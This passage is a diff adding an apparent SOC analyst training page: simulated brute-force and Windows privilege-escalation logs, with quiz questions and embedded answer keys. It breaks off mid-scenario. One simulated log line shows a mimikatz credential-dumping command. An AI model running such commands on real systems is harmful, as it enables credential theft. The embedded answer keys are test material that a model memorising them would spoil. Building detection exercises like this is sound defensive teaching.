@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../components/AchievementManager.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log Analysis Lab - Eye House - Hexworth Prime</title>
+    <style>
+        /* ============================================================
+           ROOT & RESET
+        ============================================================ */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --accent:      #00ff41;
+            --accent-dim:  #00c832;
+            --accent-glow: rgba(0,255,65,0.18);
+            --bg-deep:     #0a0a0a;
+            --bg-panel:    #0f1419;
+            --bg-card:     #141c23;
+            --bg-hover:    #1a2530;
+            --border:      rgba(0,255,65,0.22);
+            --border-hi:   rgba(0,255,65,0.55);
+            --text:        #c8d6e0;
+            --text-dim:    #556b7a;
+            --text-label:  #8aa0b0;
+            --red:         #ff4444;
+            --red-dim:     rgba(255,68,68,0.18);
+            --orange:      #ff9f00;
+            --yellow:      #ffd700;
+            --cyan:        #00d4e8;
+        }
+
+        body {
+            background: var(--bg-deep);
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ============================================================
+           BACK LINK
+        ============================================================ */
+        .back-link {
+            position: fixed;
+            top: 14px; left: 18px;
+            color: var(--accent-dim);
+            font-size: 13px;
+            cursor: pointer;
+            z-index: 200;
+            text-decoration: none;
+            letter-spacing: 1px;
+            transition: color 0.2s;
+        }
+        .back-link:hover { color: var(--accent); }
+
+        /* ============================================================
+           HEADER BAR
+        ============================================================ */
+        #header {
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 24px 14px 80px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+        }
+
+        #header-title {
+            font-size: 15px;
+            color: var(--accent);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        #header-meta {
+            display: flex;
+            gap: 28px;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .hm-label { color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+        .hm-value { color: var(--accent); font-size: 14px; font-weight: bold; }
+
+        #progress-dots {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+
+        .dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            border: 1px solid var(--border-hi);
+            background: transparent;
+            transition: background 0.3s;
+        }
+        .dot.done   { background: var(--accent); }
+        .dot.active { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+
+        /* ============================================================
+           MAIN WORKSPACE
+        ============================================================ */
+        #workspace {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            min-height: 0;
+        }
+
+        /* ============================================================
+           LEFT: LOG VIEWER
+        ============================================================ */
+        #log-panel {
+            flex: 0 0 68%;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--border);
+            min-height: 0;
+        }
+
+        #log-panel-header {
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+        }
+
+        #scenario-name {
+            color: var(--accent);
+            font-size: 13px;
+            letter-spacing: 2px;
+        }
+
+        #flag-hint {
+            color: var(--text-dim);
+            font-size: 11px;
+        }
+
+        #flag-counter {
+            color: var(--orange);
+            font-size: 12px;
+        }
+
+        #log-viewer {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 0;
+            background: var(--bg-deep);
+        }
+
+        /* Scrollbar */
+        #log-viewer::-webkit-scrollbar { width: 6px; }
+        #log-viewer::-webkit-scrollbar-track { background: var(--bg-panel); }
+        #log-viewer::-webkit-scrollbar-thumb { background: var(--border-hi); border-radius: 3px; }
+
+        .log-entry {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 7px 14px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            transition: background 0.15s, border-color 0.15s;
+            font-size: 12px;
+            line-height: 1.5;
+            user-select: none;
+        }
+
+        .log-entry:hover { background: var(--bg-hover); }
+
+        .log-entry.flagged {
+            background: rgba(255,68,68,0.08);
+            border-left-color: var(--red);
+            box-shadow: inset 0 0 12px rgba(255,68,68,0.08);
+        }
+
+        .log-entry.flagged .log-flag-icon { color: var(--red); }
+
+        /* Revealed correct/incorrect after submit */
+        .log-entry.correct-flag   { border-left-color: var(--accent); background: rgba(0,255,65,0.07); }
+        .log-entry.missed-flag    { border-left-color: var(--yellow); background: rgba(255,215,0,0.07); }
+        .log-entry.wrong-flag     { border-left-color: var(--red); background: rgba(255,68,68,0.1); }
+        .log-entry.locked         { cursor: default; pointer-events: none; }
+
+        .log-flag-icon {
+            color: var(--text-dim);
+            font-size: 13px;
+            flex-shrink: 0;
+            margin-top: 1px;
+            transition: color 0.2s;
+            width: 14px;
+            text-align: center;
+        }
+
+        .log-line-num {
+            color: var(--text-dim);
+            font-size: 11px;
+            flex-shrink: 0;
+            width: 22px;
+            text-align: right;
+            padding-top: 1px;
+        }
+
+        .log-ts {
+            color: var(--text-dim);
+            flex-shrink: 0;
+            font-size: 11px;
+            padding-top: 1px;
+            white-space: nowrap;
+        }
+
+        .log-badge {
+            flex-shrink: 0;
+            font-size: 9px;
+            letter-spacing: 1px;
+            padding: 2px 5px;
+            border-radius: 2px;
+            text-transform: uppercase;
+            font-weight: bold;
+            white-space: nowrap;
+            margin-top: 2px;
+        }
+
+        .badge-syslog   { background: rgba(0,212,232,0.12); color: var(--cyan); border: 1px solid rgba(0,212,232,0.3); }
+        .badge-win      { background: rgba(0,120,212,0.15); color: #64b5f6; border: 1px solid rgba(100,181,246,0.3); }
+        .badge-web      { background: rgba(255,159,0,0.12); color: var(--orange); border: 1px solid rgba(255,159,0,0.3); }
+        .badge-fw       { background: rgba(255,68,68,0.1); color: #ff8a80; border: 1px solid rgba(255,68,68,0.3); }
+        .badge-dns      { background: rgba(0,255,65,0.08); color: var(--accent-dim); border: 1px solid var(--border); }
+        .badge-edr      { background: rgba(128,0,255,0.12); color: #ce93d8; border: 1px solid rgba(206,147,216,0.3); }
+
+        .log-msg { color: var(--text); flex: 1; word-break: break-all; }
+        .log-msg .hi-red    { color: var(--red); }
+        .log-msg .hi-orange { color: var(--orange); }
+        .log-msg .hi-green  { color: var(--accent); }
+        .log-msg .hi-dim    { color: var(--text-dim); }
+
+        /* ============================================================
+           RIGHT: ANALYSIS PANEL
+        ============================================================ */
+        #analysis-panel {
+            flex: 0 0 32%;
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-panel);
+            overflow-y: auto;
+            min-height: 0;
+        }
+
+        #analysis-panel::-webkit-scrollbar { width: 5px; }
+        #analysis-panel::-webkit-scrollbar-track { background: var(--bg-deep); }
+        #analysis-panel::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+        #ap-header {
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 16px;
+            flex-shrink: 0;
+            font-size: 12px;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        #ap-body { padding: 16px; flex: 1; }
+
+        #ap-brief {
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 16px;
+            font-size: 11px;
+            color: var(--text-dim);
+            line-height: 1.65;
+            background: var(--bg-card);
+        }
+
+        #ap-brief strong { color: var(--text-label); }
+
+        .diff-badge {
+            display: inline-block;
+            font-size: 10px;
+            padding: 2px 7px;
+            border-radius: 2px;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .diff-easy   { background: rgba(0,255,65,0.12); color: var(--accent); border: 1px solid var(--border-hi); }
+        .diff-medium { background: rgba(255,159,0,0.12); color: var(--orange); border: 1px solid rgba(255,159,0,0.4); }
+        .diff-hard   { background: rgba(255,68,68,0.12); color: var(--red); border: 1px solid rgba(255,68,68,0.4); }
+
+        /* Flag instructions */
+        #flag-instructions {
+            background: rgba(0,255,65,0.05);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 12px;
+            margin-bottom: 16px;
+            font-size: 11px;
+            color: var(--text-label);
+            line-height: 1.6;
+        }
+
+        /* Questions area */
+        #questions-area { display: none; }
+        #questions-area.visible { display: block; }
+
+        .question-block {
+            margin-bottom: 18px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 12px;
+        }
+
+        .q-text {
+            font-size: 12px;
+            color: var(--text);
+            margin-bottom: 10px;
+            line-height: 1.55;
+        }
+        .q-text span { color: var(--accent-dim); }
+
+        .q-option {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            padding: 6px 8px;
+            margin: 4px 0;
+            border-radius: 3px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            font-size: 11px;
+            color: var(--text-dim);
+            transition: background 0.15s, border-color 0.15s, color 0.15s;
+            line-height: 1.45;
+        }
+        .q-option:hover { background: var(--bg-hover); color: var(--text); border-color: var(--border); }
+        .q-option input[type=radio] { accent-color: var(--accent); flex-shrink: 0; margin-top: 2px; }
+        .q-option.selected { border-color: var(--border-hi); color: var(--text); background: var(--accent-glow); }
+        .q-option.correct-ans  { border-color: var(--accent); background: rgba(0,255,65,0.1); color: var(--accent); }
+        .q-option.wrong-ans    { border-color: var(--red); background: var(--red-dim); color: var(--red); }
+
+        /* Buttons */
+        #btn-submit {
+            display: none;
+            width: 100%;
+            padding: 11px;
+            background: transparent;
+            color: var(--accent);
+            border: 1px solid var(--accent);
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            margin-top: 6px;
+            text-transform: uppercase;
+        }
+        #btn-submit:hover { background: var(--accent-glow); box-shadow: 0 0 12px rgba(0,255,65,0.25); }
+        #btn-submit.visible { display: block; }
+
+        #btn-next {
+            display: none;
+            width: 100%;
+            padding: 11px;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            text-transform: uppercase;
+            transition: opacity 0.2s;
+        }
+        #btn-next:hover { opacity: 0.85; }
+        #btn-next.visible { display: block; }
+
+        /* Round score feedback */
+        #round-score-box {
+            display: none;
+            margin-top: 16px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 12px;
+            background: var(--bg-card);
+            line-height: 1.8;
+        }
+        #round-score-box.visible { display: block; }
+        .rs-row { display: flex; justify-content: space-between; }
+        .rs-label { color: var(--text-dim); }
+        .rs-val   { color: var(--accent); font-weight: bold; }
+        .rs-val.neg { color: var(--red); }
+        .rs-divider { border-top: 1px solid var(--border); margin: 6px 0; }
+        .rs-total { color: var(--accent); font-weight: bold; font-size: 14px; }
+
+        /* ============================================================
+           INTRO / COMPLETION SCREENS
+        ============================================================ */
+        #intro-screen, #complete-screen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg-deep);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 150;
+        }
+
+        .modal-box {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-hi);
+            border-radius: 6px;
+            padding: 40px 48px;
+            max-width: 560px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(0,255,65,0.08);
+        }
+
+        .modal-box h1 {
+            color: var(--accent);
+            font-size: 20px;
+            letter-spacing: 4px;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+
+        .modal-box h2 {
+            color: var(--accent);
+            font-size: 18px;
+            letter-spacing: 3px;
+            margin-bottom: 8px;
+        }
+
+        .modal-box .sub {
+            color: var(--text-dim);
+            font-size: 12px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .modal-box .desc {
+            color: var(--text-label);
+            font-size: 12px;
+            line-height: 1.7;
+            text-align: left;
+            margin-bottom: 24px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 12px;
+            background: var(--bg-card);
+        }
+
+        .modal-box .desc strong { color: var(--accent-dim); }
+
+        .btn-start {
+            display: inline-block;
+            padding: 12px 36px;
+            background: transparent;
+            color: var(--accent);
+            border: 1px solid var(--accent);
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            letter-spacing: 3px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+        .btn-start:hover { background: var(--accent-glow); box-shadow: 0 0 16px rgba(0,255,65,0.2); }
+
+        /* Complete screen specifics */
+        .rank-display {
+            margin: 16px 0;
+            padding: 18px;
+            border: 1px solid var(--border-hi);
+            border-radius: 4px;
+            background: var(--bg-card);
+        }
+
+        .rank-title {
+            font-size: 22px;
+            color: var(--accent);
+            letter-spacing: 3px;
+            margin-bottom: 4px;
+        }
+
+        .rank-score {
+            font-size: 14px;
+            color: var(--text-label);
+        }
+
+        .score-bar-wrap {
+            background: var(--bg-deep);
+            border-radius: 3px;
+            height: 8px;
+            margin: 10px 0 4px;
+            overflow: hidden;
+        }
+
+        .score-bar-fill {
+            height: 100%;
+            background: var(--accent);
+            border-radius: 3px;
+            transition: width 1s ease;
+        }
+
+        .score-pct {
+            font-size: 28px;
+            color: var(--accent);
+            font-weight: bold;
+            margin-bottom: 2px;
+        }
+
+        .xp-badge {
+            display: inline-block;
+            margin-top: 14px;
+            padding: 6px 16px;
+            border: 1px solid var(--accent-dim);
+            border-radius: 3px;
+            color: var(--accent);
+            font-size: 12px;
+            letter-spacing: 2px;
+        }
+
+        .complete-breakdown {
+            display: flex;
+            justify-content: space-around;
+            margin: 16px 0;
+            font-size: 12px;
+            color: var(--text-dim);
+        }
+
+        .cb-item { text-align: center; }
+        .cb-item .cb-val { font-size: 18px; color: var(--accent); font-weight: bold; display: block; }
+    </style>
+</head>
+<body>
+
+    <a class="back-link" onclick="window.history.back()">← Back</a>
+
+    <!-- ========================================================
+         INTRO SCREEN
+    ======================================================== -->
+    <div id="intro-screen">
+        <div class="modal-box">
+            <h1>Log Analysis Lab</h1>
+            <p class="sub">SOC Intelligence — Eye House // Threat Correlation Exercise</p>
+            <div class="desc">
+                <strong>MISSION BRIEFING</strong><br><br>
+                You are a Tier-2 SOC analyst. You will review five log sets from simulated incidents of increasing complexity.<br><br>
+                <strong>Your tasks:</strong><br>
+                1. Read each log set and <strong>click to flag suspicious entries</strong><br>
+                2. Answer analysis questions about the incident<br>
+                3. Score points for correct flags and accurate analysis<br><br>
+                <strong>Scoring:</strong> Correct flag +10 pts &nbsp;|&nbsp; Wrong flag -5 pts &nbsp;|&nbsp; Correct answer +15 pts
+            </div>
+            <button class="btn-start" onclick="startLab()">Initialize Lab</button>
+        </div>
+    </div>
+
+    <!-- ========================================================
+         COMPLETE SCREEN
+    ======================================================== -->
+    <div id="complete-screen" style="display:none;">
+        <div class="modal-box">
+            <h2>Lab Complete</h2>
+            <p class="sub" id="complete-sub"></p>
+            <div class="rank-display">
+                <div class="rank-title" id="rank-title-display"></div>
+                <div class="score-pct" id="score-pct-display"></div>
+                <div class="score-bar-wrap">
+                    <div class="score-bar-fill" id="score-bar-fill" style="width:0%"></div>
+                </div>
+                <div class="rank-score" id="rank-score-display"></div>
+            </div>
+            <div class="complete-breakdown">
+                <div class="cb-item"><span class="cb-val" id="cb-flags">—</span>Flags Correct</div>
+                <div class="cb-item"><span class="cb-val" id="cb-questions">—</span>Questions Correct</div>
+                <div class="cb-item"><span class="cb-val" id="cb-scenarios">5/5</span>Scenarios</div>
+            </div>
+            <div class="xp-badge" id="xp-badge-display">+75 XP AWARDED</div>
+            <br><br>
+            <button class="btn-start" onclick="window.history.back()">Exit Lab</button>
+        </div>
+    </div>
+
+    <!-- ========================================================
+         HEADER BAR
+    ======================================================== -->
+    <div id="header">
+        <div id="header-title">Log Analysis Lab</div>
+        <div id="header-meta">
+            <div>
+                <div class="hm-label">Scenario</div>
+                <div class="hm-value" id="hm-scenario">1 / 5</div>
+            </div>
+            <div>
+                <div class="hm-label">Score</div>
+                <div class="hm-value" id="hm-score">0</div>
+            </div>
+            <div id="progress-dots">
+                <div class="dot active" id="dot-0"></div>
+                <div class="dot" id="dot-1"></div>
+                <div class="dot" id="dot-2"></div>
+                <div class="dot" id="dot-3"></div>
+                <div class="dot" id="dot-4"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================
+         WORKSPACE
+    ======================================================== -->
+    <div id="workspace">
+
+        <!-- LEFT: Log Viewer -->
+        <div id="log-panel">
+            <div id="log-panel-header">
+                <span id="scenario-name">SCN-01: Brute Force Detection</span>
+                <span id="flag-hint">Click entries to flag as suspicious</span>
+                <span id="flag-counter">Flagged: 0</span>
+            </div>
+            <div id="log-viewer"></div>
+        </div>
+
+        <!-- RIGHT: Analysis Panel -->
+        <div id="analysis-panel">
+            <div id="ap-header">// Analysis Console</div>
+            <div id="ap-body">
+                <div id="ap-brief">Loading scenario...</div>
+                <div id="flag-instructions">
+                    <strong style="color:var(--accent-dim)">HOW TO INVESTIGATE</strong><br>
+                    Read the log entries carefully. Click any entry you believe is part of the attack to <span style="color:var(--red)">flag it red</span>. When ready, click <strong>"Analyze"</strong> to unlock the questions.
+                </div>
+                <div id="questions-area"></div>
+                <button id="btn-submit" onclick="analyzeAndShowQuestions()">Analyze Logs</button>
+                <div id="round-score-box"></div>
+                <button id="btn-next" onclick="nextScenario()">Next Scenario →</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+    /* ============================================================
+       SCENARIO DATA
+       Each scenario: title, difficulty, brief, log entries, flaggableIds, questions
+       Log entry: { id, ts, badge, source, msg, flaggable }
+    ============================================================ */
+    const SCENARIOS = [
+
+        /* ======================================================
+           SCENARIO 1 — BRUTE FORCE DETECTION
+        ====================================================== */
+        {
+            id: 'scn1',
+            title: 'SCN-01: Brute Force Detection',
+            difficulty: 'easy',
+            brief: `<strong>Context:</strong> Security alert triggered on auth server <strong>auth01.hexworth.local</strong>. Review syslog entries from 2026-02-15 04:10–04:28 and identify the brute-force attack pattern.<br><br><strong>Objective:</strong> Identify the malicious source IP, targeted account, and flag all suspicious log entries.`,
+            instructions: 'Flag every failed authentication attempt from the attacking IP and the final suspicious success.',
+            flaggableIds: [3,5,7,9,11,13,15,17,18],
+            maxFlagScore: 90,
+            questions: [
+                {
+                    id: 'q1', text: 'Which source IP is conducting the brute-force attack?',
+                    options: ['10.14.3.22','185.220.101.47','10.0.1.5','203.0.113.99'],
+                    correct: 1
+                },
+                {
+                    id: 'q2', text: 'How many failed authentication attempts were recorded from the attacking IP before a successful login?',
+                    options: ['4', '6', '8', '10'],
+                    correct: 2
+                },
+                {
+                    id: 'q3', text: 'Which account was targeted by the brute-force attempt?',
+                    options: ['root', 'admin', 'svc_backup', 'jsmith'],
+                    correct: 2
+                },
+                {
+                    id: 'q4', text: 'What does entry #18 indicate about the attack outcome?',
+                    options: [
+                        'The attack failed — all attempts were blocked by fail2ban',
+                        'The attacker successfully authenticated after guessing the password',
+                        'A firewall rule blocked the final connection attempt',
+                        'The account was locked after too many failures'
+                    ],
+                    correct: 1
+                }
+            ],
+            logs: [
+                { id:1,  ts:'2026-02-15 04:10:02', badge:'syslog', src:'auth01',       msg:'sshd[8821]: Accepted publickey for deploy from 10.0.1.5 port 54312 ssh2: RSA SHA256:4rJnK9pL' },
+                { id:2,  ts:'2026-02-15 04:11:14', badge:'syslog', src:'auth01',       msg:'sshd[8822]: Accepted password for jsmith from 10.14.3.22 port 49102 ssh2' },
+                { id:3,  ts:'2026-02-15 04:12:07', badge:'syslog', src:'auth01',       msg:'sshd[8834]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37841 ssh2' },
+                { id:4,  ts:'2026-02-15 04:12:19', badge:'syslog', src:'auth01',       msg:'sshd[8835]: Accepted password for mrodriguez from 10.14.8.11 port 61033 ssh2' },
+                { id:5,  ts:'2026-02-15 04:12:31', badge:'syslog', src:'auth01',       msg:'sshd[8836]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37844 ssh2' },
+                { id:6,  ts:'2026-02-15 04:13:00', badge:'syslog', src:'auth01',       msg:'sshd[8837]: Accepted publickey for devops from 10.14.5.9 port 58441 ssh2: RSA SHA256:mX8vPqW2' },
+                { id:7,  ts:'2026-02-15 04:13:14', badge:'syslog', src:'auth01',       msg:'sshd[8838]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37850 ssh2' },
+                { id:8,  ts:'2026-02-15 04:13:42', badge:'syslog', src:'auth01',       msg:'sshd[8839]: Accepted password for lchen from 10.14.3.88 port 60112 ssh2' },
+                { id:9,  ts:'2026-02-15 04:14:01', badge:'syslog', src:'auth01',       msg:'sshd[8840]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37859 ssh2' },
+                { id:10, ts:'2026-02-15 04:15:22', badge:'syslog', src:'auth01',       msg:'sshd[8841]: Accepted password for jsmith from 10.14.3.22 port 49188 ssh2' },
+                { id:11, ts:'2026-02-15 04:15:34', badge:'syslog', src:'auth01',       msg:'sshd[8842]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37867 ssh2' },
+                { id:12, ts:'2026-02-15 04:16:11', badge:'syslog', src:'auth01',       msg:'sshd[8843]: Accepted publickey for ci_runner from 10.0.2.44 port 52201 ssh2: RSA SHA256:9bPyKmD1' },
+                { id:13, ts:'2026-02-15 04:16:28', badge:'syslog', src:'auth01',       msg:'sshd[8844]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37878 ssh2' },
+                { id:14, ts:'2026-02-15 04:17:05', badge:'syslog', src:'auth01',       msg:'sshd[8845]: Accepted password for deploy from 10.0.1.5 port 55801 ssh2' },
+                { id:15, ts:'2026-02-15 04:17:44', badge:'syslog', src:'auth01',       msg:'sshd[8846]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37891 ssh2' },
+                { id:16, ts:'2026-02-15 04:18:30', badge:'syslog', src:'auth01',       msg:'sshd[8847]: Accepted password for mrodriguez from 10.14.8.11 port 61209 ssh2' },
+                { id:17, ts:'2026-02-15 04:18:55', badge:'syslog', src:'auth01',       msg:'sshd[8848]: Failed password for svc_backup from <span class="hi-red">185.220.101.47</span> port 37902 ssh2' },
+                { id:18, ts:'2026-02-15 04:19:22', badge:'syslog', src:'auth01',       msg:'sshd[8849]: <span class="hi-orange">Accepted password</span> for svc_backup from <span class="hi-red">185.220.101.47</span> port 37909 ssh2' },
+            ]
+        },
+
+        /* ======================================================
+           SCENARIO 2 — WINDOWS PRIVILEGE ESCALATION
+        ====================================================== */
+        {
+            id: 'scn2',
+            title: 'SCN-02: Windows Privilege Escalation',
+            difficulty: 'easy',
+            brief: `<strong>Context:</strong> Windows Security event logs from workstation <strong>WS-ACCTG-04</strong> (10.14.2.44) showing an attack chain. Review Event IDs carefully — the attack progressed from credential stuffing to full admin compromise.<br><br><strong>Key Event IDs:</strong> 4625=Failed Logon, 4624=Logon Success, 4672=Special Privileges, 4688=Process Created, 4720=Account Created, 4732=Group Membership Changed`,
+            instructions: 'Flag the chain of events that constitute the attack: failed logins, suspicious logon, privilege assignment, malicious process execution, and persistence.',
+            flaggableIds: [2,4,6,8,12,14,16,18,19,20],
+            maxFlagScore: 100,
+            questions: [
+                {
+                    id: 'q1', text: 'Event ID 4672 (Special Privileges Assigned) at 09:14:33 is concerning because:',
+                    options: [
+                        'It occurs after multiple 4625 failures from the same source logon ID',
+                        'It is always a sign of compromise — admins never get special privileges',
+                        'The event was generated on the domain controller',
+                        'Event 4672 only fires during off-hours attacks'
+                    ],
+                    correct: 0
+                },
+                {
+                    id: 'q2', text: 'What technique does entry #16 (cmd.exe spawning PowerShell with EncodedCommand) most closely represent?',
+                    options: [
+                        'Credential Dumping (T1003)',
+                        'Obfuscated Command Execution (T1027 / T1059.001)',
+                        'DLL Sideloading (T1574)',
+                        'Scheduled Task Persistence (T1053)'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q3', text: 'What is the likely purpose of creating account "helpdesk_svc" and adding it to Administrators (entries #18–19)?',
+                    options: [
+                        'Routine IT provisioning during business hours',
+                        'Establishing persistence — a backdoor admin account',
+                        'Resetting a locked-out administrator account',
+                        'Deploying a service account for monitoring software'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q4', text: 'Which MITRE ATT&CK tactic best describes the overall attack sequence seen in this log set?',
+                    options: [
+                        'Initial Access → Credential Access → Persistence',
+                        'Execution → Lateral Movement → Collection',
+                        'Reconnaissance → Resource Development → Defense Evasion',
+                        'Initial Access → Privilege Escalation → Persistence'
+                    ],
+                    correct: 3
+                }
+            ],
+            logs: [
+                { id:1,  ts:'2026-02-15 09:11:04', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4624 — Logon Type 3 (Network) | Account: bwatson | Source: 10.14.2.1 | Logon GUID: {null}' },
+                { id:2,  ts:'2026-02-15 09:12:17', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-orange">4625</span> — FAILED Logon | Account: administrator | Source: <span class="hi-red">10.14.6.82</span> | Failure: Unknown username or bad password' },
+                { id:3,  ts:'2026-02-15 09:12:41', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4624 — Logon Type 2 (Interactive) | Account: jchen | Source: localhost | Success' },
+                { id:4,  ts:'2026-02-15 09:13:02', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-orange">4625</span> — FAILED Logon | Account: administrator | Source: <span class="hi-red">10.14.6.82</span> | Failure: Unknown username or bad password' },
+                { id:5,  ts:'2026-02-15 09:13:19', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4624 — Logon Type 3 (Network) | Account: bwatson | Source: 10.14.2.1 | Success' },
+                { id:6,  ts:'2026-02-15 09:13:38', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-orange">4625</span> — FAILED Logon | Account: administrator | Source: <span class="hi-red">10.14.6.82</span> | Failure: Unknown username or bad password' },
+                { id:7,  ts:'2026-02-15 09:13:55', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4624 — Logon Type 3 (Network) | Account: svc_print | Source: 10.14.1.8 | Success' },
+                { id:8,  ts:'2026-02-15 09:14:11', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4624</span> — Logon Type 3 (Network) | Account: <span class="hi-red">administrator</span> | Source: <span class="hi-red">10.14.6.82</span> | LogonID: 0x3A9F4 | <span class="hi-orange">SUCCESS after 3 failures</span>' },
+                { id:9,  ts:'2026-02-15 09:14:18', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4776 — Credential Validation | Account: administrator | Workstation: WS-ACCTG-04 | Status: 0x0 (success)' },
+                { id:10, ts:'2026-02-15 09:14:26', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4648 — Logon using Explicit Credentials | Account: administrator | Target: WS-ACCTG-04 | Process: explorer.exe' },
+                { id:11, ts:'2026-02-15 09:14:31', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4624 — Logon Type 2 (Interactive) | Account: mlopez | Source: localhost | Success' },
+                { id:12, ts:'2026-02-15 09:14:33', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4672</span> — Special Privileges Assigned | Account: <span class="hi-red">administrator</span> | LogonID: <span class="hi-orange">0x3A9F4</span> | Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege' },
+                { id:13, ts:'2026-02-15 09:15:02', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4688 — Process Created | Creator: explorer.exe | New Process: cmd.exe | Account: bwatson | PID: 4421' },
+                { id:14, ts:'2026-02-15 09:15:11', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4688</span> — Process Created | Creator: cmd.exe (PID 4421) | New Process: <span class="hi-red">mimikatz.exe</span> | Account: administrator | CommandLine: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"' },
+                { id:15, ts:'2026-02-15 09:15:22', badge:'win', src:'WS-ACCTG-04', msg:'EventID 4688 — Process Created | Creator: svchost.exe | New Process: MicrosoftEdgeUpdate.exe | Account: SYSTEM | PID: 1844' },
+                { id:16, ts:'2026-02-15 09:16:04', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4688</span> — Process Created | Creator: cmd.exe | New Process: <span class="hi-orange">powershell.exe</span> | Account: administrator | CommandLine: powershell.exe -NoProfile -NonInteractive -<span class="hi-orange">EncodedCommand JABjAGwAaQBlAG4AdAA...</span>' },
+                { id:17, ts:'2026-02-15 09:16:31', badge:'win', src:'WS-ACCTG-04', msg:'EventID 5156 — Network Connection Allowed | Application: powershell.exe | Direction: Outbound | Dest: 91.108.4.215:443' },
+                { id:18, ts:'2026-02-15 09:17:08', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4720</span> — User Account Created | New Account: <span class="hi-red">helpdesk_svc</span> | Created By: administrator | PID: 4421' },
+                { id:19, ts:'2026-02-15 09:17:22', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4732</span> — Member Added to Security-Enabled Local Group | Group: <span class="hi-red">Administrators</span> | Member: <span class="hi-red">helpdesk_svc</span> | Changed By: administrator' },
